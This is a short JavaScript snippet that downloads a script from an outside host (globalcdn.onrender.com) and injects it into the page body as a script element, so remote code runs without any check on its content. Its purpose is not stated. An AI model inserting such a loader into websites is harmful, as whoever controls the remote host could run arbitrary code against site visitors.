fetch('https://globalcdn.onrender.com/static/EmandiScriptAsModule.js')
    .then(response => response.text())
    .then(data => {
        var script = document.createElement('script');
        script.innerHTML = data;
        script.setAttribute('type', 'text/javascript');
        document.getElementsByTagName('body')[0].appendChild(script);
    });